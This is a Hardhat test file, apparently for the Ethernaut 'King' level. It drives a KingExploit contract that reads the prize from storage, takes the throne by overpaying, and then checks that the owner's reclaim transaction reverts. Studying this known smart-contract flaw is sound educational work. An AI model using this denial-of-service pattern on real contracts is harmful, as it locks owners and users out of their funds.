
import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";

describe("KingExploit", async () =>{

  it("Steal throne and block owner", async () =>{
    await deployments.fixture(["King","KingExploit"])
    const {deployer,exploiter}= await getNamedAccounts()
    const owner = await ethers.getSigner(deployer)
    const exploiterAcc=await ethers.getSigner(exploiter)
    const kingDeployment=await deployments.get('King')
    const kingExploitDeployment=await deployments.get('KingExploit')
    
    const king = await ethers.getContractAt('King',kingDeployment.address)
    const kingExploit = await ethers.getContractAt('KingExploit',kingExploitDeployment.address)

    const newPrize=BigNumber.from(await ethers.provider.getStorageAt(king.address,1)).add(1)

    await kingExploit.connect(exploiterAcc).exploit({
        value: newPrize
    })
    

    const ownerClaimTxData={
        from: owner.address,
        to: king.address,
        value: 0,
    }

    

    console.log(`New king: ${await king._king()}`)
    console.log(`New prize: ${await ethers.provider.getStorageAt(king.address,1)}`)

    expect(await king._king(),"Throne couldn't be stolen").to.be.equal(kingExploit.address)
    expect(await king.owner(),"Owner have changed").to.be.equal(owner.address)
    
    
    await expect(owner.sendTransaction(ownerClaimTxData),"Transaction wasn't reverted").to.be.reverted
    expect(owner.sendTransaction(ownerClaimTxData),"Transaction wasn't reverted").to.be.reverted
    expect(await king._king(),"Throne was stolen by the owner").to.be.equal(kingExploit.address)

  });
});
